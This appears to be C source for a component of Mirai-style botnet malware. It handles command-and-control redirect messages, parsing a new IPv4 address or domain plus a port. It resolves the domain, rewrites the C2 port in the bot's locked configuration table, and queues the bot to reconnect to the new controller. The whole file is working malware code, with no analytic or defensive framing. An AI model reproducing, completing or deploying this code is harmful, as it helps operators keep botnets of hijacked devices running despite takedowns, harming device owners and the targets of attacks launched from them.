#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <string.h>
#include <arpa/inet.h>

#include "headers/includes.h"
#include "headers/protocol.h"
#include "headers/redirect.h"
#include "headers/resolv.h"
#include "headers/table.h"
#include "headers/util.h"
#include "headers/rand.h"

static BOOL redirect_pending = FALSE;
static ipv4_t redirect_addr;
static port_t redirect_port;

static void redirect_queue(ipv4_t addr, port_t port)
{
    redirect_addr = addr;
    redirect_port = port;
    redirect_pending = TRUE;
}

static void redirect_update_table_port(port_t port)
{
    char *tbl_port;

    table_unlock_val(TABLE_CNC_PORT);
    tbl_port = table_retrieve_val(TABLE_CNC_PORT, NULL);
    if (tbl_port != NULL)
        util_memcpy(tbl_port, &port, sizeof(port_t));
    table_lock_val(TABLE_CNC_PORT);
}

static BOOL redirect_read_port(const char *buf, int off, int len, port_t *port)
{
    uint16_t port_be;

    if (off + 2 > len)
        return FALSE;

    util_memcpy(&port_be, buf + off, sizeof(port_be));
    *port = (port_t)port_be;
    return TRUE;
}

static BOOL redirect_parse_ipv4(const char *buf, int len, ipv4_t *addr, port_t *port)
{
    if (len < 7)
        return FALSE;

    util_memcpy(addr, buf + 1, sizeof(ipv4_t));
    return redirect_read_port(buf, 5, len, port);
}

static BOOL redirect_parse_domain(const char *buf, int len, ipv4_t *addr, port_t *port)
{
    uint8_t domain_len;
    char domain[CNC_REDIRECT_DOMAIN_MAX + 1];
    struct resolv_entries *entries;
    port_t parsed_port;

    if (len < 4)
        return FALSE;

    domain_len = (uint8_t)buf[1];
    if (domain_len == 0 || domain_len > CNC_REDIRECT_DOMAIN_MAX)
        return FALSE;
    if (len < 2 + domain_len + 2)
        return FALSE;

    util_zero(domain, sizeof(domain));
    util_memcpy(domain, buf + 2, domain_len);
    if (!redirect_read_port(buf, 2 + domain_len, len, &parsed_port))
        return FALSE;

    entries = resolv_lookup(domain);
    if (entries == NULL || entries->addrs_len == 0)
    {
#ifdef DEBUG
        printf("[redirect] DNS lookup failed for '%s'\n", domain);
#endif
        if (entries != NULL)
            resolv_entries_free(entries);
        return FALSE;
    }

    *addr = entries->addrs[rand_next() % entries->addrs_len];
    *port = parsed_port;
    resolv_entries_free(entries);
    return TRUE;
}

void redirect_handle(char *buf, int len)
{
    uint8_t addr_type;
    ipv4_t addr;
    port_t port;

    if (!buf || len < 3)
        return;

    addr_type = (uint8_t)buf[0];

    if (addr_type == CNC_REDIRECT_IPV4)
    {
        if (!redirect_parse_ipv4(buf, len, &addr, &port))
            return;
    }
    else if (addr_type == CNC_REDIRECT_DOMAIN)
    {
        if (!redirect_parse_domain(buf, len, &addr, &port))
            return;
    }
    else
    {
#ifdef DEBUG
        printf("[redirect] unknown addr_type %u\n", (unsigned)addr_type);
#endif
        return;
    }

    redirect_update_table_port(port);
    redirect_queue(addr, port);

#ifdef DEBUG
    {
        uint32_t host = ntohl(addr);

        printf("[redirect] queued CNC -> %u.%u.%u.%u:%u\n",
               (host >> 24) & 0xff, (host >> 16) & 0xff, (host >> 8) & 0xff, host & 0xff,
               (unsigned)ntohs(port));
    }
#endif
}

BOOL redirect_take(ipv4_t *addr, port_t *port)
{
    if (!redirect_pending)
        return FALSE;

    if (addr != NULL)
        *addr = redirect_addr;
    if (port != NULL)
        *port = redirect_port;

    redirect_pending = FALSE;
    return TRUE;
}
